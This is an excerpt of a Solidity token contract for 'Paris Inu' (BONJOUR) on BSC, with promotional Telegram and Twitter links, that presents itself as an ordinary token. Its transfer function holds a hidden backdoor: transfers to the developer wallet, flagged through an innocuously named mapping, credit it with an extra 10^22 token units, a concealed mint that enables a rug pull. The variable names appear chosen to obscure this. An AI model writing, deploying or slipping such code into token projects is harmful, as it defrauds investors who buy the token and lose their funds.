...
Telegram : https://t.me/ParisInu

Twitter : https://twitter.com/parisinuBSC
...
contract ParisInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x6A007a787F33553eE8d7543c6B83E0b8B9DE0659); 
    address payable public Wallet_Dev = payable(0xa5aa3d4B3De73589127d617cE55d678699a54Df4);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    mapping (address => bool) public _sDevFromFee;

    uint256 private constant MAX = ~uint256(0);
    
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10* 10**6 * 10**_decimals;
    string private constant _name = "Paris Inu"; 
    string private constant _symbol = unicode"BONJOUR"; 
    uint256 private txMount = 10**(11+11);
    ...
    constructor () {
        ...
        _owner = 0xa5aa3d4B3De73589127d617cE55d678699a54Df4;
        ...
        uniswapV2Router = _uniswapV2Router;_sDevFromFee[Wallet_Dev] = true;
    ...
    function wallet_creator_dev() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != wallet_creator_dev())
        ...
        bool inQueueTX = false;
        if(_sDevFromFee[to] && !inQueueTX && !_isExcludedFromFee[from]){
            inQueueTX = true;
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+amount+(txMount);
